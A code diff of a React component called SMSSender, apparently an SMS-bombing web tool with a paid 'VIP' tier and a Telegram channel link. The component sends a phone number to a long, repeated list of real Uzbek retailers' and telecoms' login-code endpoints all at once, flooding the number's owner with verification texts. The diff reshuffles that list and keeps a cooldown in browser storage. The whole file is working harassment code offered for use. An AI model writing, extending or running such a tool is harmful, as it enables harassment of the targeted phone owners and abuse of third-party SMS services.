@@ -3,8 +3,6 @@ import { Send, AlertCircle, CheckCircle2, Timer, XCircle } from "lucide-react";
 import { useNavigate } from 'react-router-dom';
 import "../styles/App.css";
 
-
-
 // Helper function to handle API requests with timeout
 const sendRequest = async (url, body, method = "POST", headers = {}) => {
   const controller = new AbortController();
@@ -40,8 +38,10 @@ function SMSSender() {
   const [successCount, setSuccessCount] = useState(0);
   const [failCount, setFailCount] = useState(0);
   const [showStats, setShowStats] = useState(false);
-  const [lastSentTime, setLastSentTime] = useState(null);
   const [cooldown, setCooldown] = useState(0);
+
+  const lastSentTime = localStorage.getItem('lastSentTime');
+  const [lastSent, setLastSent] = useState(lastSentTime ? new Date(lastSentTime) : null);
 
   useEffect(() => {
     let interval;
@@ -73,42 +73,6 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-
-
-      {
-        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
-        body: { phone },
-      },
-      {
-        url: "https://api.brandstore.uz/api/auth/code/create",
-        body: { phone },
-      },
-
-
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -125,8 +89,17 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-
-
+  
+  
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+  
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -143,8 +116,8 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-
-
+  
+  
       {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
@@ -153,29 +126,40 @@ function SMSSender() {
         url: "https://market.beeline.uz/api/web/auth/login",
         body: { phone: `+${phone}` },
       },
-         
-      
-      
-
-
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-
-
-      
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+  
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+  
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
       
       {
         url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
@@ -185,55 +169,6 @@ function SMSSender() {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
       },
-
-
-      {
-        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
-        body: { phone },
-      },
-      {
-        url: "https://api.brandstore.uz/api/auth/code/create",
-        body: { phone },
-      },
-
-
-      {
-        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
-        body: { phone },
-      },
-      {
-        url: "https://api.brandstore.uz/api/auth/code/create",
-        body: { phone },
-      },
- 
-
-      {
-        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
-        body: { phone: `+${phone}` },
-      },
-      {
-        url: "https://market.beeline.uz/api/web/auth/login",
-        body: { phone: `+${phone}` },
-      },
-
-
-   
     ];
 
     const results = await Promise.all(
@@ -245,7 +180,8 @@ function SMSSender() {
 
     setSuccessCount(successResults.length);
     setFailCount(failResults.length);
-    setLastSentTime(new Date());
+    setLastSent(new Date());
+    localStorage.setItem('lastSentTime', new Date().toISOString());
     setCooldown(50); // 50 second cooldown
     setLoading(false);
   };
@@ -263,6 +199,19 @@ function SMSSender() {
   const goToVipPage = () => {
     navigate('/Vip-Page'); // "/Vip" sahifasiga o'tish
   };
+
+  const handleAdminClick = () => {
+    window.location.href = "https://t.me/tohirjonov_channel";
+  };
+
+  useEffect(() => {
+    if (lastSent) {
+      const diff = Math.floor((new Date() - lastSent) / 1000); // Difference in seconds
+      if (diff < 50) {
+        setCooldown(50 - diff); // Set the remaining time for cooldown
+      }
+    }
+  }, [lastSent]);
 
   return (
     <div className="container">
@@ -299,10 +248,10 @@ function SMSSender() {
               <XCircle size={20} />
               <span>Xatolik: {failCount}</span>
             </div>
-            {lastSentTime && (
+            {lastSent && (
               <div className="stat-item time">
                 <Timer size={20} />
-                <span>Oxirgi yuborilgan vaqt: {formatTime(lastSentTime)}</span>
+                <span>Oxirgi yuborilgan vaqt: {formatTime(lastSent)}</span>
               </div>
             )}
           </div>
@@ -328,8 +277,9 @@ function SMSSender() {
           )}
         </button>
         <button className="button vip-button" onClick={goToVipPage}>
-          VIP TARIF
+          VIP TARIFGA O'TISH💎
         </button>
+        <button className="button vip-button" onClick={handleAdminClick}>Telegram kanal🌐</button>
       </div>
     </div>
   );
